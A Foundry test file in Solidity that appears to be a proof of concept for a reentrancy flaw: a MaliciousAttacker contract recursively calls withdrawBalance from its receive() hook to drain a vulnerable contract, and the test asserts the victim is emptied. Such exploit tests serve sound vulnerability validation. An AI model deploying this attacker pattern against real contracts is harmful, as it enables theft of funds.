// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_simple.sol";

contract MaliciousAttacker {
    Reentrance public victim;
    uint256 public count = 0;
    uint256 public constant MAX_RECURSION = 2;  // Changed from 1 to 2 to drain full 3 ETH

    constructor(Reentrance _victim) {
        victim = _victim;
    }

    function deposit() public payable {
        victim.addToBalance{value: msg.value}();
    }

    function attack() public {
        victim.withdrawBalance();
    }

    receive() external payable {
        if (count < MAX_RECURSION) {
            count++;
            victim.withdrawBalance();
        }
    }
}

contract ReentrancyTest is Test {
    Reentrance public victim;
    MaliciousAttacker public attacker;

    function setUp() public {
        victim = new Reentrance();
        attacker = new MaliciousAttacker(victim);
    }

    function testReentrancyExploit() public {
        // Fund attacker with 1 ether for deposit
        vm.deal(address(attacker), 1 ether);

        // Attacker deposits 1 ether
        attacker.deposit{value: 1 ether}();
        assertEq(victim.getBalance(address(attacker)), 1 ether);

        // Fund victim contract with 2 additional ether (total 3 ETH)
        deal(address(victim), 3 ether);
        assertEq(address(victim).balance, 3 ether);

        console.log("--- BEFORE-Trigger State ---");
        // Capture pre-attack state using separate variables
        uint256 preVictimEth = address(victim).balance;
        uint256 preAttackerEth = address(attacker).balance;
        uint256 preContractBalance = victim.getContractBalance();
        uint256 preTotalWithdrawals = victim.totalWithdrawals();
        uint256 preAttackerRecord = victim.getBalance(address(attacker));

        console.log("Victim ETH balance [BEFORE]:", preVictimEth);
        console.log("Attacker ETH balance [BEFORE]:", preAttackerEth);
        console.log("Contract balance (victim view) [BEFORE]:", preContractBalance);
        console.log("Total withdrawals [BEFORE]:", preTotalWithdrawals);
        console.log("Attacker recorded balance [BEFORE]:", preAttackerRecord);

        // Calculate expected attacker ETH balance after attack
        uint256 expectedAttackerEth = preAttackerEth + preVictimEth;

        console.log("\n--- Trigger: Attacker executes reentrancy ---");
        // Execute attack (will withdraw 3 times)
        attacker.attack();

        console.log("\n--- AFTER-Trigger State ---");
        // Capture post-attack state using separate variables
        uint256 postVictimEth = address(victim).balance;
        uint256 postAttackerEth = address(attacker).balance;
        uint256 postContractBalance = victim.getContractBalance();
        uint256 postTotalWithdrawals = victim.totalWithdrawals();
        uint256 postAttackerRecord = victim.getBalance(address(attacker));

        console.log("Victim ETH balance [AFTER]:", postVictimEth);
        console.log("Attacker ETH balance [AFTER]:", postAttackerEth);
        console.log("Contract balance (victim view) [AFTER]:", postContractBalance);
        console.log("Total withdrawals [AFTER]:", postTotalWithdrawals);
        console.log("Attacker recorded balance [AFTER]:", postAttackerRecord);

        console.log("\n--- Differential Analysis ---");
        uint256 victimEthDiff = preVictimEth - postVictimEth;
        uint256 withdrawalsDiff = postTotalWithdrawals - preTotalWithdrawals;
        uint256 attackerRecordDiff = preAttackerRecord - postAttackerRecord;

        console.log("ETH drained from victim:", victimEthDiff);
        console.log("Total withdrawals delta:", withdrawalsDiff);
        console.log("Attacker recorded balance reduction:", attackerRecordDiff);

        // Vulnerability validation criteria
        bool victimDrained = postVictimEth == 0;
        bool withdrawalsIncreased = postTotalWithdrawals == preTotalWithdrawals + preVictimEth;
        bool attackerRecordCleared = postAttackerRecord == 0;
        bool fundsTransferred = postAttackerEth == expectedAttackerEth;

        bool vulnerabilityExists = victimDrained && withdrawalsIncreased && attackerRecordCleared && fundsTransferred;

        // Final verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Successfully drained contract via reentrancy");
        } else {
            if (!victimDrained) console.log(unicode"[X] Victim contract not fully drained");
            if (!withdrawalsIncreased) console.log(unicode"[X] Withdrawals didn't increase correctly");
            if (!attackerRecordCleared) console.log(unicode"[X] Attacker balance not cleared");
            if (!fundsTransferred) console.log(unicode"[X] Funds transfer incomplete");
            console.log("Vulnerability not Exist: Exploit conditions not met");
        }

        // Assert final state
        assertEq(postAttackerRecord, 0, "Attacker recorded balance not cleared");
        assertEq(postVictimEth, 0, "Victim ETH not drained");
        assertEq(postAttackerEth, expectedAttackerEth, "Attacker ETH mismatch");
    }
}